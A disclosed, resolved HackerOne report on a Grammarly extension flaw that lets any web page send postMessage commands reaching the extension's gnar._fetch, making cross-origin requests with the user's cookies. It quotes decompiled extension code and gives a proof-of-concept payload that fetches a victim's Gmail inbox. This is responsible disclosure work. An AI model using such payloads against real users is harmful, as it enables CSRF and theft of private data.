{"id":389108,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODkxMDg=","url":"https://hackerone.com/reports/389108","title":"Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-08-01T01:12:27.640Z","submitted_at":"2018-08-01T01:12:27.640Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"metnew","url":"/metnew","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22746,"url":"https://hackerone.com/grammarly","handle":"grammarly","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Grammarly","twitter_handle":"","website":"https://www.grammarly.com","about":"Grammarly makes sure everything you type is clear, effective, and mistake-free."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-08-01T15:59:18.760Z","bug_reporter_agreed_on_going_public_at":"2019-07-27T17:33:33.768Z","team_member_agreed_on_going_public_at":"2019-08-01T15:59:18.219Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## **Summary:**\n\nAttacker could trigger Grammarly extension's `gnar._fetch` command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.\n\n## **Description:** \n\n### Page could Init Grammarly popup editor [no user gesture, helper]\n\nEvents have `isTrusted` property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.\n\nAs I understood: injected content script could successfully emit events to background page only if popup was initiated earlier. \nThat means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.\n\nNot sure about the root cause of this behavior. Probably, because popup is created by background page origin, that's why background page becomes accessible after this.\n\n## Sending commands to Grammarly content script\n\nActive page could send commands to injected Grammarly content script using `window.postMessage`.\n\nCommand structure:\n``` js\nwindow.postMessage({\n    grammarly: true,\n    action: 'tracking',\n    method: 'gnar._fetch',\n    props: {}\n    params: {}\n}, \"*\")\n```\n\n## Commands handling in injected content script\n\nGrammarly content script \"parses\" commands using this snippet:\n\n``` js\nfunction Z(e) {\n    var t, n = e.action;\n    ... \n    \"tracking\" === n \u0026\u0026 e.method \u0026\u0026 g.call(e.method, e.param, e.props)\n    ...\n}\n```\n\n`tracking` commands are later passed to this snippet:\n``` js\nf.emitBackground(\"tracking-call\", {\n    msg: e, // command's \"method\" field\n    data: t // command's \"props\" + \"params\" fields\n }, s)\n```\n\nThis `f.emitBackground` sends event to background page.\n\n### Commands handling in extension's background page\n\nThe extension uses next snippet to handle `tracking` commands from content script:\n\n``` js\nfunction w(e, t) { // t = params + props\n    var n, a = o(e.split(\".\"), 2), // a = command's \"method\" field splitted by dot into array\n        c = a[0],\n        s = a[1];\n    if (\"gnar\" === c) \n        if (p.tracker.gnar)\n            if (\"track\" === s) {\n                var u = o(t, 2),\n                    l = u[0], // \n                    f = u[1];\n                p.tracker.gnar.track(r({\n                    eventName: g.gnarAppName + \"/\" + l // something not discovered yet \n                }, f))\n            } else\n                p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t)) : b.error(\n                    \"gnar client does not have method '\" + s + \"' for '\" +\n                    e + \"' in runMessage\");\n    else b.error(\"gnar client not available for '\" + e + \"' in runMessage\");\n    else b.error(\"unrecognized'\" + e + \"' in runMessage \")\n}\n```\n\n#### `p.tracker.gnar`\n\nThat's an object with next structure:\n```js\n{\n    _batchId: 8,\n    _client: \"chromeExt\",\n    _clientVersion: \"14.858.1756\",\n    _containerIdManager: t {primaryStorage: t, secondaryStorages: Array(3), _logger: t, _metric: e,  _cacheSuccessTimeoutMillis: 1000, …},\n    _eventsUrl: \"https://gnar.grammarly.com/events\",\n    _fetch: ƒ (),\n    _instanceId: \"nxIwqgPE\",\n    _isTest: false,\n    _isUserReady: true,\n    _liteUrl: \"https://gnar.grammarly.com/lite\",\n    _logger: t {name: \"gnar\", level: 2, context: e, appender: ƒ},\n    _metric: t {name: \"gnar\", timersSink: ƒ, countersSink: ƒ, _fetch: ƒ, _sendTimeout: 7500, …},\n    _queue: [],\n    _storePingTimestamp: true,\n    _userId: \"701014151\n}\n```\n\nAdditionally, it has a set of methods.\n\n\u003e I guess `p.tracker.gnar` controls reporting telemetry events to Grammarly.\n\n#### Attacker-controllable function call\n\n``` js\np.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t))\n```\n\n`s` = that's the second part of command's \"method\" field. E.g. `\"method\": \"hello.grammarly\"` -\u003e s = 'grammarly'\n`t` = `params` and `props`\n\nThis snippet could be rewritten as:\n\n``` js\nGNAR[methodsMethod].apply(GNAR,  toArray(paramsAndProps))\n```\n\n#### `p.tracker.gnar`s `.constructor` and methods\n\n`p.tracker.gnar` object could be overwritten using `.constructor`  and `.setUser` methods those allow changing some `p.tracker.gnar` properties. \n\n`p.tracker.gnar`s `.constructor`\n```\nfunction e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`\n            void 0 === s \u0026\u0026 (s = !1),\n            this._client = t,\n            this._clientVersion = n,\n            this._fetch = r,\n            this._containerIdManager = o,\n            this._logger = i,\n            this._metric = c,\n            this._storePingTimestamp = s,\n            this._instanceId = a.alphanumeric(8),\n            this._batchId = 0,\n            this._isUserReady = !1,\n            this._queue = [],\n            this._eventsUrl = e + \"/events\",\n            this._liteUrl = e + \"/lite\",\n            this._pingMaybe()\n        }\n```\n\n##### `gnar.setUser`/`gnar._execQueue` / `gnar._send` / `gnar._doSend` / `gnar._enqueue` \n\n`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session. \n\n``` js\na[\"session-invalidate\"] = function (e, t, n, r, o) {\n        ...\n        s.call(\"gnar.setUser\", i, c)\n        ...\n}\n```\n\n\u003e I'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. \n\nTeam probably should know how much powerful listed above funcstions are. \n\n#### `_fetch`\n\n`p.tracker.gnar` has `_fetch` property which points to `fetch` function.\nMore interesting is that, it's a polyfill, not a native function.\n\n\u003e I guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to `data:/chrome-extension:/` origins.\n\nThat means, it's possible to call `fetch()` with attacker's params from the extension.\n\n```\np.tracker.gnar_fetch.apply(p.tracker.gnar, [\"FetchURL\", \"FetchParams\"])\n```\n\nPage has to call `window.postMessage` with next object to call `fetch` from the extension\n```\nx = window.top.postMessage({\n    grammarly: true,\n    action: 'tracking',\n    method: 'gnar._fetch',\n    props: { // FetchParams\n        method: 'GET',\n        headers: {\n            'Content-Type': 'application/json'\n        }\n    },\n    param: 'https://mail.google.com/mail/u/0/#inbox' // \u003cFetchURL\u003e\n}, \"*\")\n```\n\n#### XHR + cookies\n\nGrammarly extension has permissions to access all URLs and cookies from all origins. \nGrammarly makes all XHR requests with cookies -\u003e it's possible for attacker to make blind requests with cookies to any origin.\n\n\u003e (except `chrome://`, however, `chrome-extension://` is allowed because of polyfill for `fetch`).\n\n\u003e More details in \"Impact\" section.\n\n## Browsers Verified In:\n\nChrome 70.0.3508.0 Canary\nChrome 68.0.3440.75 Stable\nGrammarly: 14.858.1756\n\n## Steps To Reproduce:\n\n### Change user's name in Grammarly\n1. Open `app-grammarly-csfr.html`\n2. Page makes request to `https://auth.grammarly.com/v3/user` to change your name to \"Anonymous User\" \n\n### GET Gmail as proof\n1. Open Grammarly extension debug page in Chrome\n2. Open `get-request-to-gmail.html`\n3. Open \"Network\" tab in the debug page\n4. Note that extension made a GET request to Gmail (with cookies)\n5. Open request preview\n6. Note that request includes your gmail content\n7.  That means, it's possible to initiate requests with cookies to any origin. Web applications without \"direct CSRF protection\" (e.g. `hidden` field with some value, not token in cookies ) are controllable by attacker.\n\n## Supporting Material/References:\n\n1. Screencast for POST to`https://auth.grammarly.com/v3/user`. [1st PoC]\n2. Screencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] \n\n\u003e I didn't know a good CSRF target, so I've recorded a second screencast with Gmail and GET request. I think that's enough to prove the vulnerability.\n\n## Impact\n\n## Universal CSRF\n\u003e Actually, \"Universal CSRF\" isn't a correct definition 😉. But I think it correctly expresses impact of the vulnerability.\n\nAttacker could trigger Grammarly extension's `gnar._fetch` command  using crafted page to perform XHR with any configurational params to any origin [without user gesture]. \n\nWeb applications without good protection against CSRF (`hidden` field in form, not cookies/origin check/etc.) are vulnerable to CSRF. \n\nPage could made **any number of blind requests through Grammarly extension with cookies**. \n\n## Overwrite `p.tracker.gnar` and call any method of this object\n\n`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session.\n\n\u003e I assume, calling this methods leads to sending invalid telemetry data to Grammarly.\n\n## Possible UXSS via data manipulation\n\nAttacker could overwrite `p.tracker.gnar` with arbitrary data. However, `postMessage` doesn't allow to send [non-clonable objects](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).\n\nAttacker could call something like:\n\n```\nAnythingClonable.apply(Object, [AnythingClonable])\n```\n\n\u003e I didn't test this with `File/Blob/FileList` non-clonnable objects. However, I think it's not possible to turn the snippet above into XSS.\n \n\u003e P.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at `hackerone.com` domain.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003c/h2\u003e\n\n\u003cp\u003eAttacker could trigger Grammarly extension\u0026#39;s \u003ccode\u003egnar._fetch\u003c/code\u003e command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/h2\u003e\n\n\u003ch3 id=\"page-could-init-grammarly-popup-editor-no-user-gesture-helper\"\u003ePage could Init Grammarly popup editor [no user gesture, helper]\u003c/h3\u003e\n\n\u003cp\u003eEvents have \u003ccode\u003eisTrusted\u003c/code\u003e property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.\u003c/p\u003e\n\n\u003cp\u003eAs I understood: injected content script could successfully emit events to background page only if popup was initiated earlier. \u003cbr\u003e\nThat means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.\u003c/p\u003e\n\n\u003cp\u003eNot sure about the root cause of this behavior. Probably, because popup is created by background page origin, that\u0026#39;s why background page becomes accessible after this.\u003c/p\u003e\n\n\u003ch2 id=\"sending-commands-to-grammarly-content-script\"\u003eSending commands to Grammarly content script\u003c/h2\u003e\n\n\u003cp\u003eActive page could send commands to injected Grammarly content script using \u003ccode\u003ewindow.postMessage\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eCommand structure:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n    \u003cspan class=\"na\"\u003egrammarly\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eaction\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003etracking\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003egnar._fetch\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eprops\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"commands-handling-in-injected-content-script\"\u003eCommands handling in injected content script\u003c/h2\u003e\n\n\u003cp\u003eGrammarly content script \u0026quot;parses\u0026quot; commands using this snippet:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eZ\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaction\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e...\u003c/span\u003e \n    \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etracking\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emethod\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparam\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprops\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003etracking\u003c/code\u003e commands are later passed to this snippet:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eemitBackground\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etracking-call\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"c1\"\u003e// command\u0026#39;s \u0026quot;method\u0026quot; field\u003c/span\u003e\n    \u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"c1\"\u003e// command\u0026#39;s \u0026quot;props\u0026quot; + \u0026quot;params\u0026quot; fields\u003c/span\u003e\n \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis \u003ccode\u003ef.emitBackground\u003c/code\u003e sends event to background page.\u003c/p\u003e\n\n\u003ch3 id=\"commands-handling-in-extension-s-background-page\"\u003eCommands handling in extension\u0026#39;s background page\u003c/h3\u003e\n\n\u003cp\u003eThe extension uses next snippet to handle \u003ccode\u003etracking\u003c/code\u003e commands from content script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"c1\"\u003e// t = params + props\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"c1\"\u003e// a = command\u0026#39;s \u0026quot;method\u0026quot; field splitted by dot into array\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egnar\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etracker\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egnar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etrack\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n                    \u003cspan class=\"nx\"\u003el\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u003c/span\u003e\n                    \u003cspan class=\"nx\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etracker\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egnar\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etrack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n                    \u003cspan class=\"na\"\u003eeventName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egnarAppName\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003el\u003c/span\u003e \u003cspan class=\"c1\"\u003e// something not discovered yet \u003c/span\u003e\n                \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etracker\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egnar\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etracker\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egnar\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n                    \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egnar client does not have method \u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; for \u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\n                    \u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; in runMessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egnar client not available for \u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; in runMessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 